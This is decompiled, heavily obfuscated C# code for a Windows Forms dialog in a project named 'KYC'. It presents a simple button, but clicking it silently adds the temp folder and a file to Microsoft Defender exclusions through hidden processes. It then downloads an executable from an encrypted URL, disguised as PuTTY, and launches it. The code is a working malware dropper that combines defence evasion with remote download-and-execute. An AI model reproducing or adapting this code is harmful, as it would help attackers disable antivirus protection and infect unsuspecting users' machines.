using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using UwVuqLlLJvprAoS3fc;
using g8T6n6RbLPwmR1ScAJ;

namespace KYC;

public class Form2 : Form
{
	private IContainer components;

	private Label label1;

	private PictureBox pictureBox1;

	private Button button1;

	public Form2()
	{
		dil2BPgckjnUlJwuku.UrZapk9nD();
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	private async Task DownloadAndRunPutty()
	{
		string puttyUrl = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FEA192 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe);
		string puttyPath = Path.Combine(Path.GetTempPath(), gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3F70C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49));
		string tempFolder = Path.GetTempPath();
		try
		{
			AddPathToDefenderExclusions(tempFolder);
			AddFileToDefenderExclusions(puttyPath);
			using (WebClient client = new WebClient())
			{
				await client.DownloadFileTaskAsync(new Uri(puttyUrl), puttyPath);
			}
			AddFileToDefenderExclusions(puttyPath);
			Process.Start(puttyPath);
		}
		catch (Exception)
		{
		}
	}

	private void AddPathToDefenderExclusions(string path)
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A4B36 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
				Arguments = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C297E8F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b) + path + gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B2344 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63),
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			using Process process = Process.Start(startInfo);
			process.WaitForExit(3000);
		}
		catch (Exception)
		{
		}
	}

	private void AddFileToDefenderExclusions(string filePath)
	{
		try
		{
			if (File.Exists(filePath))
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12234EC4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b),
					Arguments = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EEFE5A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6) + filePath + gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB179 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76),
					UseShellExecute = false,
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden
				};
				using Process process = Process.Start(startInfo);
				process.WaitForExit(3000);
				return;
			}
		}
		catch (Exception)
		{
		}
	}

	private bool IsRunningAsAdministrator()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch
		{
			return false;
		}
	}

	private async void button1_Click(object sender, EventArgs e)
	{
		await DownloadAndRunPutty();
		((Control)new Form3()).Show();
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		//IL_01ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f9: Expected O, but got Unknown
		label1 = new Label();
		pictureBox1 = new PictureBox();
		button1 = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CF912 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = SystemColors.ControlLightLight;
		((Control)label1).Location = new Point(67, 66);
		((Control)label1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF8040 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((Control)label1).Size = new Size(435, 19);
		((Control)label1).TabIndex = 0;
		((Control)label1).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x596CC1CE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((Control)pictureBox1).Location = new Point(-12, 52);
		((Control)pictureBox1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -600049461 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((Control)pictureBox1).Size = new Size(100, 50);
		pictureBox1.SizeMode = (PictureBoxSizeMode)4;
		pictureBox1.TabIndex = 1;
		pictureBox1.TabStop = false;
		((Control)pictureBox1).Click += pictureBox1_Click;
		((Control)button1).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -1582677417 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button1).ForeColor = SystemColors.ControlLightLight;
		((Control)button1).Location = new Point(205, 119);
		((Control)button1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1B82E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)button1).Size = new Size(95, 35);
		((Control)button1).TabIndex = 2;
		((Control)button1).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F19CA8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((ButtonBase)button1).UseVisualStyleBackColor = false;
		((Control)button1).Click += button1_Click;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.FromArgb(16, 26, 40);
		((Form)this).ClientSize = new Size(535, 199);
		((Control)this).Controls.Add((Control)(object)button1);
		((Control)this).Controls.Add((Control)(object)label1);
		((Control)this).Controls.Add((Control)(object)pictureBox1);
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A28450 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675);
		((Form)this).ShowIcon = false;
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
